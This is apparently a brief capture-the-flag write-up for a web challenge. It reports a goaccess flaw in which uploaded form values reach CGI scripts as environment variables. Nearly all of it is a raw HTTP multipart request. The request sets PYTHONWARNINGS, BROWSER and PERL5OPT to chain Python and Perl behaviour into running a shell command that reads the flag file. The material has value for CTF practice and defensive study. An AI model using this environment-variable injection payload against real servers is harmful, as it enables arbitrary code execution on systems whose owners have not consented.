# Advancement (web 340)
A zero-day in goaccess caused by not sanitizing form values in uploads. These are passed directly as environment variables to CGI scripts, and can result in arbitrary code execution.

Here is my raw payload:

```
POST /cgi-bin/date HTTP/1.1
Host: advancement.chal.perfect.blue
Connection: close
Content-Length: 300
Content-Type: multipart/form-data; boundary=----W

------W
Content-Disposition: form-data; name="PYTHONWARNINGS"

all:0:antigravity.x:0:0
------W
Content-Disposition: form-data; name="BROWSER"

perlthanks
------W
Content-Disposition: form-data; name="PERL5OPT"

-Mbase;print(`cat\x20/flag`);exit;
------W--
padding so i don't have to recalculate the length wowowowowowow

```
